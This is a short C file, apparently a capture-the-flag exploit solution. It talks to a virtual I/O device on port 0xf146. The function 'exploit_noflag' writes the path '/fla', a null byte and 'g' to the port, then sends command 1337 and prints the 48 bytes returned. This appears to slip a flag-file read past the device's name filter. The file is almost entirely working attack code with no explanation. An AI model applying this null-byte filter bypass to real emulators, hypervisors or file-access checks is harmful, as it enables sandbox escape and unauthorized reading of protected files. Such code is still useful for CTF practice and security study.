void noflag_give_file(char* file)
{
   int i = 0;
   while(1)
   {
      if (file[i] == '\0')
      {
         break;
      }
      _outb(file[i], 0xf146);
      i += 1;
   }
   _outd(1337, 0xf146);
   for (i = 0; i< 10; i++)
   {
      kprintc(_inb(0xf146));
   }
}


void exploit_noflag(void) {
  _outb('/', 0xf146);
  _outb('f', 0xf146);
  _outb('l', 0xf146);
  _outb('a', 0xf146);
  _outb(0, 0xf146);
  _outb('g', 0xf146);
  _outd(1337, 0xf146);

  for (int i = 0; i < 48; i++)
    kprintc(_inb(0xf146));

  kprints("\r\n");
}
